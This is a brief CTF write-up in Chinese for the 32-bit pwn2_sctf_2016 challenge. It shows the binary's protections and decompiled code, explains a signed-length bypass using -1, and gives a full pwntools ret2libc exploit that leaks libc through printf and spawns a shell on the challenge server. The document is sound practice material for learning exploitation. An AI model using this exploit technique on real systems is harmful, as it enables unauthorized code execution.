# pwn2_sctf_2016

## 保护

```bash
$ checksec --file=pwn2_sctf_2016
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



## main函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  return vuln();
}
```



## vuln函数

```c
int vuln()
{
  char nptr[32]; // [esp+1Ch] [ebp-2Ch] BYREF
  int v2; // [esp+3Ch] [ebp-Ch]

  printf("How many bytes do you want me to read? ");
  get_n(nptr, 4);
  v2 = atoi(nptr);
  if ( v2 > 32 )
    return printf("No! That size (%d) is too large!\n", v2);
  printf("Ok, sounds good. Give me %u bytes of data!\n", v2);
  get_n(nptr, v2);
  return printf("You said: %s\n", nptr);
}
```



## 逻辑

输入4长度给v2，转为int类型后判断，如果大于32，退出；如果小于32，则再次接受长度的输入

输入-1绕过长度判断



## EXP

```python
from pwn import *
from LibcSearcher import *
context(arch="i386",os="linux",log_level="debug")
#r=process('./pwn2_sctf_2016')
r=remote('node4.buuoj.cn',26185)
elf=ELF('./pwn2_sctf_2016')
pr_plt=elf.plt['printf']
pr_got=elf.got['printf']
main_addr=0x080485B8
str_addr=0x080486F8
r.sendlineafter('? ',"-1")
payload=b'a'*48+p32(pr_plt)+p32(main_addr)+p32(str_addr)+p32(pr_got)
r.sendlineafter("data!\n",payload)
#函数结束前的输出字符串
r.recvuntil('said: ')
#rop执行后输出的字符串，其中有函数地址
r.recvuntil('said: ')

printf_addr = u32(r.recv(4))
libc = LibcSearcher('printf', printf_addr)
libc_base=printf_addr-libc.dump('printf')
sys_addr=libc_base+libc.dump('system')
str_addr=libc_base+libc.dump('str_bin_sh')
r.sendlineafter('? ',"-1")
payload2=b'a'*48+p32(sys_addr) + p32(main_addr) + p32(str_addr)

r.sendlineafter("data!\n",payload2)
r.interactive()
```

